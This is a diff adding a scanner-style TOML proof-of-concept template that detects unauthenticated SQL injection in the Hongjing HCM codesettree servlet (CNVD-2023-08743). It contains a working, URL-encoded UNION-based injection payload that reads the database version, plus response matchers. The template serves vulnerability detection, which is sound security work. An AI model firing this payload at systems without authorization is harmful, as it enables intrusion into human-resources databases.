@@ -1,0 +1,32 @@
+[info]
+id = "POC-AVE-2026-0067"
+name = "宏景HCM codesettree SQL注入检测 PoC"
+author = "AVE"
+severity = "critical"
+tags = ["sqli", "cnvd-2023-08743", "hongjing", "hcm", "unauthenticated"]
+description = "宏景eHR/宏景HCM人力资源信息管理系统/servlet/codesettree接口categories参数存在SQL注入漏洞，未授权攻击者可通过Union注入获取数据库版本信息"
+vuln_id = ["CNVD-2023-08743", "AVE-2026-0067"]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27hongjing~27~2c~40~40version~2d~2d"
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["hongjing"]
+expect = true
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["Microsoft SQL Server"]
+expect = true
